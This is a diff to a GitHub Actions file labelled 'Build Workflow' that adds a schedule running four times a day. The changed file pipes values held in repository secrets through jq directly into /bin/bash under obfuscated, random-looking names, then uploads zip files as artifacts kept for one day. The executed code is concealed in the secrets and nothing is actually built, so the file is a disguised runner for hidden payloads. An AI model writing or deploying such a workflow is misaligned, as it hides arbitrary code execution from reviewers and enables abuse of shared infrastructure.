@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '51 5,11,17,23 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,18 +18,16 @@ jobs:
           fetch-depth: 1
       - name: Launch
         env:
-          c30855: ${{ secrets.c30855 }}
+          g6: ${{ secrets.g6 }}
         run: |
-          printf '%s' "$c30855" | jq -r .ya5734 | /bin/bash
-          printf '%s' "$hob65689" | jq -r .lpr551 | /bin/bash
-          printf '%s' "$lboy784" | jq -r .db931 | /bin/bash
-          printf '%s' "$qeci54" | jq -r .qrg03 | /bin/bash
-          printf '%s' "$hcey5" | jq -r .j65157 | /bin/bash
+          printf '%s' "$g6" | jq -r .gi1 | /bin/bash
+          echo $kdw267 | jq -r .ims7000 | /bin/bash
+          printf '%s' "$k902" | jq -r .csc45262 | /bin/bash
 
       - name: Persist output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: du8mQ882
+          name: eq9G8qS8
           path: "*.zip"
           retention-days: 1
